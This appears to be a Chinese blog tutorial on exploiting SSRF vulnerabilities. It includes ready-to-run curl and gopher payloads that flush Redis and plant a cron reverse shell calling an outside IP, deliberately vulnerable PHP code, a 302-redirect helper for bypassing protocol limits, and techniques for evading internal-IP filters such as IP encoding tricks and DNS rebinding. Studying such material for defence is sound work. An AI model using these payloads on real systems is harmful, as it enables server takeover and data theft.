-<h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dict protocol - 探测Redis</span></span><br><span class="line">curl -v <span class="string">&#x27;dict://127.0.0.1:6379/info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file protocol - 任意文件读取</span></span><br><span class="line">curl -v <span class="string">&#x27;file:///etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gopher protocol - 一键反弹Bash</span></span><br><span class="line"><span class="comment"># * 注意: 链接使用单引号，避免$变量问题</span></span><br><span class="line">curl -v <span class="string">&#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><h4 id="漏洞代码ssrf-php（未做任何SSRF防御）"><a href="#漏洞代码ssrf-php（未做任何SSRF防御）" class="headerlink" title="漏洞代码ssrf.php（未做任何SSRF防御）"></a>漏洞代码ssrf.php（未做任何SSRF防御）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure>
-<h4 id="远程利用方式"><a href="#远程利用方式" class="headerlink" title="远程利用方式"></a>远程利用方式</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用file协议任意文件读取</span></span><br><span class="line">curl -v <span class="string">&#x27;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用dict协议查看端口</span></span><br><span class="line">curl -v <span class="string">&#x27;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用gopher协议反弹shell</span></span><br><span class="line">curl -v <span class="string">&#x27;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="漏洞代码ssrf2-php"><a href="#漏洞代码ssrf2-php" class="headerlink" title="漏洞代码ssrf2.php"></a>漏洞代码ssrf2.php</h4><ul>
-<li>限制协议为HTTP、HTTPS</li>
-<li>设置跳转重定向为True（默认不跳转）</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">True</span>);</span><br><span class="line">    <span class="comment">// 限制为HTTPS、HTTP协议</span></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="远程利用方式-1"><a href="#远程利用方式-1" class="headerlink" title="远程利用方式"></a>远程利用方式</h4><p>当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL</p>
-<p>那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p>
-<p>我们继续构造一个302跳转服务，代码如下302.php:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$schema</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span>     = <span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>   = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$port</span>))&#123;  </span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="利用测试"><a href="#利用测试" class="headerlink" title="利用测试"></a>利用测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dict protocol - 探测Redis</span></span><br><span class="line">dict://127.0.0.1:6379/info  </span><br><span class="line">curl -vvv <span class="string">&#x27;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file protocol - 任意文件读取</span></span><br><span class="line">curl -vvv <span class="string">&#x27;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gopher protocol - 一键反弹Bash</span></span><br><span class="line"><span class="comment"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</span></span><br><span class="line">curl -vvv <span class="string">&#x27;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d</span></span><br><span class="line"><span class="string">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="更改IP地址写法"><a href="#更改IP地址写法" class="headerlink" title="更改IP地址写法"></a>更改IP地址写法</h3><p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^10(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$</span><br><span class="line">^172.([1][6-9]|[2]\d|3[01])(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</span><br><span class="line">^192.168(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</span><br></pre></td></tr></table></figure>
-<p>对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8进制格式：0300.0250.0.1</span><br><span class="line">16进制格式：0xC0.0xA8.0.1</span><br><span class="line">10进制整数格式：3232235521</span><br><span class="line">16进制整数格式：0xC0A80001</span><br><span class="line">合并后两位：1.1.278 &#x2F; 1.1.755</span><br><span class="line">合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267</span><br></pre></td></tr></table></figure>
-<p>另外IP中的每一位，各个进制可以混用。</p>
-<p>访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。</p>
-<p>另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。</p>
-<h3 id="使用解析到内网的域名"><a href="#使用解析到内网的域名" class="headerlink" title="使用解析到内网的域名"></a>使用解析到内网的域名</h3><p>如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。<br>另外 xip.io 、xip.name、nip.io、sslip.io提供了一个方便的服务，这个网站的子域名会解析到对应的IP</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.0.1.xip.io &gt;&gt;&gt; 192.168.0.1</span><br><span class="line">localhost &gt;&gt;&gt; 127.0.0.1</span><br></pre></td></tr></table></figure>
-<h3 id="利用-转跳"><a href="#利用-转跳" class="headerlink" title="利用@转跳"></a>利用@转跳</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com@10.10.10.10 &gt;&gt;&gt; http:&#x2F;&#x2F;10.10.10.10 </span><br></pre></td></tr></table></figure>
-<p>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a> ，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为<a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a> ，而实际上这个URL所请求的内容都是127.0.0.1上的内容。</p>
-<h3 id="利用短网址（302转跳）"><a href="#利用短网址（302转跳）" class="headerlink" title="利用短网址（302转跳）"></a>利用短网址（302转跳）</h3><p>如果服务器使用正则过滤掉了内网的IP地址，那么可以使用短地址转跳的方法。</p>
-<h3 id="利用Enclosed-alphanumerics"><a href="#利用Enclosed-alphanumerics" class="headerlink" title="利用Enclosed alphanumerics"></a>利用Enclosed alphanumerics</h3><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="利用句号"><a href="#利用句号" class="headerlink" title="利用句号"></a>利用句号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure>
-<h3 id="利用IPv6"><a href="#利用IPv6" class="headerlink" title="利用IPv6[::]"></a>利用IPv6[::]</h3><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code> 或IPv6的内网域名来绕过过滤。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::]:80&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure>
-<h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
-<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
-<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
-<ul>
-<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
-<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
-<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li>
-<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
-</ul>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://websec.readthedocs.io/zh/latest/index.html" > Web安全学习笔记<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" >SSRF漏洞的利用与学习<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://www.anquanke.com/post/id/226240" >ssrf知识点总结<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://joychou.org/web/phpssrf.html" >SSRF in PHP<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>SSRF</tag>
       </tags>
   </entry>
 </search>
